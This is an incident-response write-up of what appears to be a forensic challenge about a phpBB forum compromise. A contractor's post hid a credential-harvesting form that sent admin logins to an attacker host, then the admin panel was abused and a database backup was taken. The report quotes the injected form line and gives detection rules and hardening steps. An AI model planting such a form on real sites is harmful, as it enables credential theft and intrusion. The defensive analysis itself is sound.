
**Classification:** TLP:AMBER  
**Environment / Platform:** Linux Web Server / Apache Access Logs & SQLite3 Database / HTB Sherlock  
**Target:** Forela Internal Discussion Forum (phpBB)  

#### 1. Incident Scenario, Context, and Identification

- **Executive Summary:** An administrative compromise and database extrusion incident on the organization's internal discussion forum (phpBB) was investigated. A contractor connected to the internal Guest Wi-Fi network registered account apoole1 from IP address **10.10.0.78**. Leveraging forum functionality, the attacker published a thread containing a credential-harvesting form within a hidden iframe. When the administrator viewed the post, administrative credentials were submitted to an attacker-controlled endpoint (http://10.10.0.78/update.php). With these credentials, the contractor accessed the administrative control panel, escalated privileges into the Administrators group, extracted cleartext LDAP service credentials (Passw0rd1), and exported and downloaded a full database backup.
    
- **Telemetry Sources and Evidence:**
    
    - access.log: Apache web server HTTP request logs.
        
    - phpbb.sqlite3: Application SQLite3 database (analyzed tables: phpbb_users, phpbb_posts, phpbb_log, phpbb_config).
        

#### 2. MITRE ATT&CK® Tactical Mapping

| Tactic | Technique / Sub-technique ID | Technique Name | Specific Evidence Found |
|---|---|---|---|
| **Credential Access** | T1185 | Browser Session Hijacking / Stored Harvesting | Stored hidden iframe form in post ID 9 designed to harvest admin credentials via update.php. |
| **Privilege Escalation** | T1078.003 | Valid Accounts: Local Accounts | Hijacking of administrative account (Event ID LOG_ADMIN_AUTH_SUCCESS). |
| **Persistence** | T1098 | Account Manipulation | User apoole1 added to the Administrators group at 2023-04-26 10:53:51 UTC. |
| **Exfiltration** | T1567 | Exfiltration Over Web Service | Exfiltration and download of complete database archive backup_1682506471_dcsr71p7fyijoyq8.sql.gz. |

#### 3. Infection Chain and Detailed Forensic Analysis

- **Contractor Account Username:** **apoole1** (User ID 52).
    
- **Source IP Address:** **10.10.0.78**.
    
- **Registration Timestamp (UTC):** **2023-04-25 12:15:41 UTC**.
    

The contractor published a forum post at **2023-04-25 12:17:22 UTC**:

- **Malicious Post ID:** **9** (Topic ID 2, Forum 2).
    
- **Injected Payload:** The HTML content embedded an external authentication harvesting form:
    
    ``` HTML
    <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
    ```
    
- **Exfiltration URI:** **http://10.10.0.78/update.php** (structured to silently capture administrator credentials through a hidden iframe).
    
- **Victim Interaction:** At **2023-04-25 12:17:48 UTC** (logged in Apache as 13:17:48 +0100), the administrator (10.255.254.2) accessed viewtopic.php?f=2&t=2, triggering credential capture.
    
- **Victim User-Agent:**  
    Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
    

1. **Administrative Logon:**
    
    - At **2023-04-26 10:53:12 UTC**, the attacker logged in to the Administrative Control Panel (LOG_ADMIN_AUTH_SUCCESS in phpbb_log) from 10.10.0.78.
        
2. **Account Escalation:**
    
    - At **2023-04-26 10:53:51 UTC**, account apoole1 was added to the administrator group:
        
    - Database audit record: LOG_USERS_ADDED: Administrators, apoole.
        
3. **Cleartext LDAP Credential Extraction:**
    
    - The phpbb_config table exposed the configured directory settings:
        
    - Server: 10.10.0.11 | User: CN=phpbb-admin,OU=Service,OU=Forela,DC=forela,DC=local
        
    - **Cleartext LDAP Password:** **Passw0rd1**.
        
4. **Database Backup and Exfiltration:**
    
    - At 10:54:30 UTC, the attacker requested a database backup via a POST request to acp_database.
        
    - At **2023-04-26 11:01:38 UTC** (logged as 12:01:38 +0100), the attacker downloaded the archive:
        
        ``` TEXT
        GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1
        ```
        
    - **Backup File Size:** **34707 bytes** (HTTP 200).

``` bash
# Consultas SQL aplicadas sobre la base de datos sqlite3
sqlite3 phpbb.sqlite3 "SELECT post_id, poster_ip, datetime(post_time, 'unixepoch'), post_text FROM phpbb_posts WHERE post_id=9;"
sqlite3 phpbb.sqlite3 "SELECT datetime(log_time, 'unixepoch'), log_ip, log_operation, log_data FROM phpbb_log WHERE log_ip='10.10.0.78';"
sqlite3 phpbb.sqlite3 "SELECT config_name, config_value FROM phpbb_config WHERE config_name='ldap_password';"
```

#### 4. Detection Rules and Security Engineering

``` Secrules
SecRule REQUEST_URI "@contains /posting.php" \
    "id:1000931,phase:2,deny,status:403,log,msg:'ALERTA CTI: Intento de inyeccion de formulario externo en foro',chain"
    SecRule REQUEST_BODY "@rx (?i)<form[^>]+action=[\"']?https?://(?!(?:www\.)?forela\.local)"
```

``` SPL
index=access_logs uri_path="*/store/backup_*" status=200
| table _time, clientip, method, uri_path, bytes, useragent
```

#### 5. Containment, Eradication, and Hardening Plan

1. **Guest Network Isolation:** Revoke access and block the MAC address corresponding to 10.10.0.78 at the wireless controller.
    
2. **Forum Remediation:** Purge post ID 9 and delete all database backup archives located within the public web directory (/store/).
    
3. **Domain Credential Reset:** Because the LDAP service account password (Passw0rd1) was exposed, immediately reset the password for CN=phpbb-admin in Active Directory.
    
4. **Directory Access Restrictions:** Block direct HTTP access to the /store/ path in the Apache configuration (Require all denied).
    
5. **Network Segmentation:** Enforce isolation on the Guest Wi-Fi network, preventing access to internal application infrastructure and administrative portals.
    
6. **Content Security Policy (CSP):** Enforce strict CSP headers (form-action 'self') to prevent browsers from submitting form data to external domains or untrusted endpoints.
